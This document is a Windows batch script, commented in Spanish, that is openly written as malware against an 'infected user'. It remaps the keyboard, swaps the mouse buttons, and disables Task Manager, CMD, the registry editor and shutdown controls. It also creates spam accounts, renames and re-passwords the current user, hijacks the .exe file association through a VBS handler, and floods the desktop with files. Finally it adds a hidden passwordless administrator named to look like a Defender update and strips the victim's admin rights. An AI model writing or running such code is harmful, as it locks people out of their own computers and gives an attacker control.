::Reinicio
shutdown -r -t 20 -c "Buena Suerte eliminandome gilipollas >:D"

::Seccion de Editor de Registro

::Desabilitacion de Teclas
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 0000000000000071000000000000010000003b0000003c0000003d0000003e0000003f0000004000000041000000420000004300000044000000570000005800000037e000004600000052e0000047e0000049e0000051e000004fe0000053e0000048e000004be0000050e000004de00000520000005300000051000000500000004f0000004b0000004c0000004d0000004e0000004900000048000000470000004500000035e00000370000004a0000002900000002000000030000000400000005000000060000000700000008000000090000000a0000000b0000000c0000000d0000000f0000001000000011000000130000001600000017000000190000001a0000001b0000002b000000280000002700000026000000250000002400000022000000210000003a0000002a0000001d0000005be00000380000002c0000002d0000002e0000002f0000003000000032000000330000003400000035000000360000001de000005de000005ce0000038e000005900000065e0000021e000006be000005ee000005fe000006ae0000069e0000068e0000067e0000032e000006ce000006de0000066e0000020e000002ee000002ce0000030e0000019e0000010e0000024e0000022e0000000 /f
::Desabilitacion del Boton de apagado de la pantalla de Bloqueo
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
::Cambio de Boton del Click
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
::Desabilitacion de los botones de apagado del menu de tareas y el de Alt + F4
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
::Obliga al Usuario infectado a usar el predeterminado
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f
::Desabilitacion de Accesibilidad de la pantalla de Bloqueo
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "NUL" /f
::Cambio de Fondo
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\System32\Microsoft\Protect\Defender.Update\img000.png" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
::Activacion de Otro Usuario (Hay que coregir el codigo reg add)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayUserName /t REG_DWORD /d 3 /f
::Desabilitacion del Admin de Tareas
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
::Desabilitacion de CMD
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
::Desabilitacion del Editor de Registro (ESTO TIENE QUE ESTAR LO ULTIMO)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

::Seccion de Usuarios

::Usuarios SPAM
net user T3yZrQ Maxcheto /add
net user 8rJpX1 Maxcheto /add
net user 9MaL2Z Maxcheto /add
net user K4$dF27 Maxcheto /add
net user xC78RT Maxcheto /add
net user 3nL9$p2x Maxcheto /add
net user X7hbQ5Z Maxcheto /add
net user R2xD1B Maxcheto /add
net user m14T8z Maxcheto /add
net user L27w8G Maxcheto /add
net user P9dR2Y Maxcheto /add
net user 5QL71t Maxcheto /add
net user r8B6V3F Maxcheto /add
net user 7CXz1b Maxcheto /add
net user n38vJQ Maxcheto /add
net user x6G7P1L Maxcheto /add
net user M239Wk Maxcheto /add
net user 7F2hY4Z Maxcheto /add
net user 8QrB1L7 Maxcheto /add
net user t93V6D Maxcheto /add
net user 5tG2Q8J Maxcheto /add
net user x9K1P7L Maxcheto /add
net user z7R4M3 Maxcheto /add

::Cambio de Nombre
set "currentUser=%username%"

wmic useraccount where name='%username%' rename "YOU ARE THE NEXT"

net user "YOU ARE THE NEXT" "im dead"

::Cambio de Archivo de las fotos de usuario
set sourceDir=C:\Windows\System32\Microsoft\Protect\Defender.Update
set targetDir=C:\ProgramData\Microsoft\User Account Pictures

rem
if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

rem
copy "%sourceDir%\user-32.png" "%targetDir%"
copy "%sourceDir%\user-40.png" "%targetDir%"
copy "%sourceDir%\user-48.png" "%targetDir%"
copy "%sourceDir%\user-192.png" "%targetDir%"
copy "%sourceDir%\user.png" "%targetDir%"
copy "%sourceDir%\guest.png" "%targetDir%"
copy "%sourceDir%\user.bmp" "%targetDir%"
copy "%sourceDir%\guest.bmp" "%targetDir%"

::Fin de Seccion Usuarios

::Cambio de Configuracion de archivos.exe
assoc .exe=VBSExeHandler
ftype VBSExeHandler=wscript.exe "C:\Windows\System32\Microsoft\Protect\Defender.Update\aplicaciones.vbs" "%1" %*


::Archivos SPAM en el escritorio del infectado
set "escritorio=%USERPROFILE%\Desktop"
set "archivoFuente=C:\Windows\System32\Microsoft\Protect\Defender.Update\main.txt"

if not exist "%archivoFuente%" exit /b

for /l %%i in (1,1,400) do (
    setlocal enabledelayedexpansion
    set "randomName=!random!!random!!random!"
    copy "%archivoFuente%" "%escritorio%\%randomName%.txt" >nul
    endlocal
)

:: Cambio de roles
setlocal

set "username=WindowsDefenderUpdate.exe"
set "password="

net user "%username%" "%password%" /add
net localgroup Administradores "%username%" /add

for /f "tokens=2 delims==" %%G in ('wmic computersystem get username /value') do (
    set "currentUser=%%G"
)

net localgroup Administradores "%currentUser%" /delete

endlocal


exit